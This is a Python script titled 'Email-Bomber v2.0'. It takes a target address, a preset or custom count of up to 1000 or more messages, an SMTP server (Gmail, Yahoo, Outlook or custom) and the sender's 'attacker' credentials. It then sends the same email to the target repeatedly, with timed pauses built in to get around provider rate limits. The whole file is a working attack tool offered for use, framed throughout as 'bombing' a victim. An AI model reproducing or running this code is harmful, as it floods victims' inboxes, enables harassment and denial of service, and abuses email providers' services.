import smtplib
import sys
import time


class bColors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'


def banner():
    print(bColors.BLUE + '<<< Email-Bomber v2.0>>>')
    print(bColors.YELLOW + r'''
  _
 | |
 | |___
 |  _  \ _   _
 | |_)  | (_) |
  \____/ \__, |
          __/ |
         |___/
                                        _                                                         _
                                       | |                                                       (_)
                  ____     ____     ___| |   ___ _   ______   ______    ___ _   ______   ______   _   _ ____
                 / ___\   /    \   /  _  |  / _ | | /  ____| /  ____|  / _ | | /  ____| /  ____| | | | |   | \
                | |____  |  ()  | |  (_| | | (_|| | \_____ \ \_____ \ | (_|| | \_____ \ \_____ \ | | | |   | |
                 \____/   \____/   \____/   \___|_| |______/ |______/  \___|_| |______/ |______/ |_| |_|   |_|
     ''')


class EmailBomber:
    count = 0

    def __init__(self):
        self.countFactor = None
        self.amount = None
        self.port = None
        self.server = None
        self.fromAddr = None
        self.fromPwd = None
        self.subject = None
        self.message = None
        self.msg = None
        self.s = None
        self.r = bColors.RED
        self.g = bColors.GREEN
        self.b = bColors.BLUE
        self.y = bColors.YELLOW
        try:
            print(self.b + '\n[+] Initializing bomber ...')
            self.target = str(input(self.g + '[:] Enter Target Email > '))
            self.mode = int(input(self.g + '[:] Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) > '))

            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print(self.r + '[-] ERROR: Invalid Option!')
                sys.exit(0)

        except Exception as e:
            print(self.r + f'[-] ERROR: {e}')
            sys.exit(0)

    def bomb(self):
        try:
            print(self.b + '\n[+] Setting up bomb ...')

            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(self.g + '[:] Choose a CUSTOM amount > '))
            print(self.g + f'[+] You have selected BOMB mode {self.mode} and {self.amount} emails')

        except Exception as e:
            print(self.r + f'[-] ERROR: {e}')
            sys.exit(0)

    def email(self):
        try:
            print(self.b + '\n[+] Setting up email ...')
            self.server = str(input(self.g + '[:] Enter email server | or select premade options - 1:Gmail 2:Yahoo '
                                             '3:Outlook 4:Custom > '))
            defaultPort = True

            if self.server == '4':
                defaultPort = False
                self.port = int(input(self.g + '[:] Enter port number > '))

            if defaultPort:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(self.g + '[:] Enter attacker email address > '))
            self.fromPwd = str(input(self.g + '[:] Enter attacker password > '))
            self.subject = str(input(self.g + '[:] Enter subject > '))
            self.message = str(input(self.g + '[:] Enter message > '))

            if self.target == self.fromAddr:
                print(self.r + '\n[-] ERROR: Can\'t have same Attacker and Target address.')

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                        ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)

        except Exception as e:
            print(self.r + f'[-] ERROR: {e}')
            sys.exit(0)

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.message)
            self.count += 1
            loadSeq = float(self.count) * self.countFactor
            sys.stdout.write(self.y + '\r' + '[BOMBED EMAILS:' + self.b + f' {self.count}' + self.y + ']' + self.b +
                             ' [' + self.g + ('#' * int(loadSeq)) + self.b + ']')
            sys.stdout.flush()
            if self.count % 50 == 0 and self.count != self.amount:
                time.sleep(0.5)
                sys.stdout.flush()
                waitLimit = 60
                while waitLimit > 0:
                    sys.stdout.write(self.r + '\r' + '[↻] RESETTING CONNECTION !! => ' + self.y + ' Wait for ' +
                                     str(waitLimit) + ' seconds')
                    time.sleep(1)
                    waitLimit -= 1
                    sys.stdout.flush()

        except Exception as e:
            print(self.r + f'[-] ERROR: {e}')
            sys.exit(0)

    def attack(self):
        print(self.b + '\n[+] Attacking ...')
        print(self.y + '\r' + '[' + self.r + '☠' + self.y + '] BOMBING emails')
        self.countFactor = float(100 / self.amount)
        for email in range(self.amount):
            self.send()
        self.s.close()
        print(self.g + '\n[+] Attack Finished !!')
        print(self.g + f'[+] Successfully BOMBED {self.amount} emails !!')
        sys.exit(0)


if __name__ == '__main__':
    banner()
    bomb = EmailBomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
